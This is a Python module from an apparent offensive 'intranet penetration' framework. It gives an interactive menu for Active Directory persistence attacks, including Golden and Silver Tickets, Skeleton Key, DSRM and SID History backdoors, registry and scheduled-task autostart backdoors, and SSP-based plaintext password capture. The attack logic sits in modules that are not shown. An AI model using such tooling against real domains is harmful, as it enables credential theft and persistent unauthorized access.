import os
import sys
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI

sys.path.append(os.path.dirname(os.path.realpath(__file__)))
from AuxiliaryFunctions import MyTable
import Golden_Ticket
import Silver_Ticket
import Skeleton_Key
import DSRM_backdoor
import SID_History_backdoor
import Registry_backdoor
import SSP
import schtasks


class PermissionMaintenance:
    def __init__(self, conn):
        commands = ["back", "show params", "show functions"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Permission Maintenance] \033[0m')
        while True:
            try:
                choice = prompt(formatted_text1, completer=completer)
                if choice.lower() == 'show functions':
                    self.show_functions()
                    continue
                elif choice == "":
                    continue
                elif choice == 'back':
                    break
                elif choice == 'show params':
                    self.show_params()
                    continue
                elif choice.split()[0] == '1':
                    Golden_Ticket.Golden_Ticket(conn, choice)
                    continue
                elif choice.split()[0] == '2':
                    Silver_Ticket.Silver_Ticket(conn, choice)
                    continue
                elif choice == '3':
                    Skeleton_Key.Skeleton_Key(conn)
                    continue
                elif choice == '4':
                    DSRM_backdoor.DSRM(conn)
                    continue
                elif choice.split()[0] == '5':
                    SID_History_backdoor.SID_History(conn, choice)
                    continue
                elif choice.split()[0] == '6':
                    Registry_backdoor.Registry_backdoor(conn, choice)
                    continue
                elif choice.split()[0] == '7':
                    SSP.SSP(conn, choice)
                    continue
                elif choice.split()[0] == '8':
                    schtasks.schtasks_backdoor(conn)
                    continue
            except IndexError:
                print('\033[1;31;31m' + "[-] You need to offer other params." + '\033[0m')
                continue

    def show_params(self):
        print("\n" + '\033[1;34;34m' + "Parameter Description" + '\033[0m' + "\n" + '=' * len("Parameter Description") + "\n")
        headers = ['\033[1;34;34m' "Params" + '\033[0m', '\033[1;34;34m' "Description" + '\033[0m']
        mydata = [["domain_name", "完整的域名"], ["krbtgt_Hash_NTLM", "krbtgt的NTLM Hash值"], ["domain_sid", "域的sid值"], ["domain_administrator_name", "需要伪造的域管理员用户名"], ["dc_NTLM_Hash", "域控制器的NTLM Hash"], ["forged_username", "需要伪造的用户名"], ["backdoor_path", "后门在受害者主机上的路径"], ["mimilib.dll_path", "mimilib.dll在受害者主机上的路径"], ["username", "用户名"]]
        MyTable.createTable(headers, mydata)

    def show_functions(self):
        print("\n" + '\033[1;34;34m' + "Permission Maintenance" + '\033[0m' + "\n" + '=' * len("Permission Maintenance") + "\n")
        headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
        mydata = [["1", "Gold ticket", "1 domain_name krbtgt_Hash_NTLM domain_sid domain_administrator_name", "黄金票据攻击"],
                  ["2", "Silver ticket", "2 domain_name dc_NTLM_Hash domain_sid forged_username", "白银票据攻击(伪造CIFS服务权限)"],
                  ["3", "Universal password", "3", "万能密码"],
                  ["4", "DSRM Domain Persistence Operation", "4", "DSRM域持久化操作"],
                  ["5", "SID History Domain Backdoor", "5 username", "SID History 域后门"],
                  ["6", "Add the back door to the startup and self start item", "6 backdoor_path", "把后门添加到开机自启动项中"],
                  ["7", "Obtain login plaintext password", "7 mimilib.dll_path", "获取登录明文密码"],
                  ["8", "Schedule scheduled tasks for schtasks", "8", "schtasks计划定时任务"]]
        MyTable.createTable(headers, mydata)
